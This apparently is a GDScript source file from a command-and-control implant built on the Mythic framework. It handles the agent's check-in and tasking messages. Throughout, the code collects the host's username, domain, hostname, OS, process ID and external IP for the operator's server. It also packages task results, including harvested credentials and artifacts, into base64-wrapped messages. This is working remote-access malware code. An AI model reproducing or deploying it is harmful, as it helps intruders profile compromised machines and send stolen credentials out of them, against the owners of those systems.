extends Node

var checkin_done
var uuid_stage
var _config

const UUID_STAGE_PAYLOAD = "payload"
const UUID_STAGE_CALLBACK = "callback"

signal agent_response

func _ready():
	checkin_done = false
	uuid_stage = UUID_STAGE_PAYLOAD
	_config = $".".get_parent().get_node("config")

func checkin():
	checkin_done = true
	uuid_stage = UUID_STAGE_CALLBACK

func get_uuid():
	var uuid

	match uuid_stage:
		UUID_STAGE_PAYLOAD:
			uuid = _config.get_payload_uuid()
		UUID_STAGE_CALLBACK:
			uuid = _config.get_callback_uuid()
		_:
			uuid = false

	return uuid

func get_checkin_payload():
	# https:#docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin
	var username
	if OS.has_environment("USERNAME"):
		username = OS.get_environment("USERNAME")
	else:
		username = "UnknownUserName"

	var userdomain
	if OS.has_environment("USERDOMAIN"):
		userdomain = OS.get_environment("USERDOMAIN")
	else:
		userdomain = ""

	var hostname = OS.get_unique_id()
	if OS.has_environment("COMPUTERNAME"):
		hostname = OS.get_environment("COMPUTERNAME")
	if OS.has_environment("HOSTNAME"):
		hostname = OS.get_environment("HOSTNAME")

	var os = "%s (%s) - %s [%s] - %s" % [OS.get_name(), OS.get_model_name(), OS.get_version(), OS.get_distribution_name(), DisplayServer.get_name()]
	if OS.has_environment("OS"):
		os = OS.get_environment("OS")
	else:
		if OS.has_feature("Windows"):
			os = "Windows"
		elif OS.has_feature("X11"):
			os = "Linux"
		elif OS.has_feature("OSX"):
			os = "Mac"

	var architecture = "Unknown"
	if OS.has_feature("32"):
		architecture = "32"
	if OS.has_feature("64"):
		architecture = "64"
	if OS.has_feature("x86"):
		architecture = "x86"
	if OS.has_feature("x86_64"):
		architecture = "x86_64"

	var ip: String = "127.0.0.1"# TODO...?
	var upnp = UPNP.new()
	var err = upnp.discover(1000, 4)
	
	if err != OK:
		print(str(err))
	else:
		ip = upnp.query_external_address()

	var payload = {
		"action": "checkin", # requiredupnp.queryexternaladdress(), #",".join(IP.get_local_addresses()), # internal ip address - required
		"ip": ip,
		"os": os, # os version - required
		"process_name":  OS.get_unique_id(),
		"user": username, # username of current user - required
		"host": hostname, # hostname of the computer - required
		"pid": OS.get_process_id(), # pid of the current process - required
		"uuid": get_uuid(), #uuid of the payload - required
		"architecture": architecture, # platform arch - optional
		"domain": userdomain, # domain of the host - optional
		"integrity_level": 3, # integrity level of the process - optional
		#"external_ip": "8.8.8.8", # external ip if known - optional
		"encryption_key": "", # encryption key - optional
		"decryption_key": "", # decryption key - optional
	}

	return JSON.stringify(payload)

func get_tasking_payload():
	var payload = {
		"action": "get_tasking",
		"tasking_size": 1,
		#"delegates": [],
		#"get_delegate_tasks": false,# no p2p for us at this time...
	}

	return JSON.stringify(payload)


func create_task_response(status, completed, task_id, output, artifacts = [], credentials = [], unkeyed_payloads = []):
	var payload = {
		"action": "post_response",
		"responses": [],
	}

	var task_response = {
		"task_id": task_id,
		"user_output": output,
		"status": "error",
		"completed": completed,
	}

	if artifacts.size() > 0:
		task_response["artifacts"] = []

		for artifact in artifacts:
			var entry = {}

			entry["base_artifact"] = artifact[0]
			entry["artifact"] = artifact[1]
			task_response["artifacts"].append(entry)

	if credentials.size() > 0:
		task_response["credentials"] = credentials

	for response in unkeyed_payloads:
		payload["responses"].append(response)

	if unkeyed_payloads.size() <= 0:

		if status:
			task_response["status"] = "success"

		payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?

	return JSON.stringify(payload)
	
func unwrap_payload(packet):
	var ret = {
		"action": "",
		"payload": "",
		"uuid": "",
		"status": false
	}

	var data = Marshalls.base64_to_utf8(packet)
	
	ret["uuid"] = data.substr(0, 36)

	# TODO: decryption
	var test_json_conv = JSON.new()
	test_json_conv.parse(data.substr(36))
	ret["payload"] = test_json_conv.get_data()

	if ret["payload"].has("action"):
		ret["action"] = ret["payload"].get("action")

	if ret["payload"].has("status"):
		ret["status"] = ret["payload"].get("status") == "success"

	return ret

func wrap_payload(payload):
	if _config.should_encrypt():
		pass # TODO: implement encryption
	else:
		payload = Marshalls.utf8_to_base64(get_uuid() + payload).to_utf8_buffer()

	return payload

func send_agent_response(payload):
	print("sending payload: ", payload)

	payload = wrap_payload(payload)

	if payload:
		emit_signal("agent_response", payload)
	else:
		print("agent response empty / false : ", payload)

func _on_tasking_post_response(tasks):
	# {"action":"post_response","responses":[{"task_id":"e8e7f996-45db-4ed6-a6ea-2f013c747ef4","status":"success"}]}
	# TODO: keep queue and 'check off' items which are status success from the retry queue?
	print("_on_tasking_post_response: ", tasks)
